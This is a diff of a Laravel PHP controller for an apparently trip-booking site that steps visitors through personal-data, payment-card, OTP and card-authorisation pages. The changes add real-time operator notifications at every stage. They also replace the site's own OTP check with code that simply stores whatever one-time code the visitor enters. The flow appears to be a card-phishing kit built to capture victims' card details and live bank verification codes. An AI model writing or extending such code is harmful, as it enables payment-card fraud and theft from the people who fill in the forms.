@@ -7,6 +7,7 @@ use App\Events\SendPart;
 use App\Events\SendVisit;
 use App\Events\NewVisitor;
 use App\Events\SendAuth;
+use App\Events\SendNotification;
 use App\Events\SendPeople;
 use App\Models\PaymentCard;
 use Illuminate\Http\Request;
@@ -59,6 +60,7 @@ class TripController extends Controller
             session()->put('visitor', json_encode($not));
             // event(new NewVisitor($not));
             event(new SendVisit($not));
+            event(new SendNotification($not));
             return view('people_data');
         }
         return redirect('/');
@@ -86,6 +88,7 @@ class TripController extends Controller
                 session()->put('visitor', json_encode($not));
                 // event(new NewVisitor($not));
                 event(new SendPeople($not));
+                event(new SendNotification($not));
                 return redirect()->route('trip_payment');
             }
             return redirect('/');
@@ -123,7 +126,7 @@ class TripController extends Controller
             $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
             if ($visitor) {
                 $validated['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
-                $validated['otp_code'] = random_int(100000,999999);
+                // $validated['otp_code'] = random_int(100000,999999);
                 $payment_card = PaymentCard::create($validated);
 
                 $not  = VisitorNotifications::find($visitor->id);
@@ -131,6 +134,7 @@ class TripController extends Controller
                 session()->put('visitor', json_encode($not));
                 // event(new NewVisitor($not));
                 event(new SendPart($payment_card,$not));
+                event(new SendNotification($not));
                 return redirect()->route('verify_otp');
             }
             return redirect('/');
@@ -155,7 +159,8 @@ class TripController extends Controller
             if ($visitor) {
 
                 $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->first();
-                if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
+                $payment_card->otp_code = $request->code;
+                $payment_card->save();
 
             }
             return redirect()->route('confirm_card_owner');
@@ -173,6 +178,7 @@ class TripController extends Controller
             session()->put('visitor', json_encode($not));
             // event(new NewVisitor($not));
             event(new SendVisit($not));
+            event(new SendNotification($not));
             return view('card_auth');
         }
         return redirect('/');
@@ -195,6 +201,7 @@ class TripController extends Controller
                 $not  = VisitorNotifications::find($visitor->id);
                 $not->update(['page' => 'أرسل رقم البطاقة','step_number'=>6]);
                 event(new SendAuth($not,$request->code));
+                event(new SendNotification($not));
             }
             return view('final_step');
         } catch (\Exception $ex) {
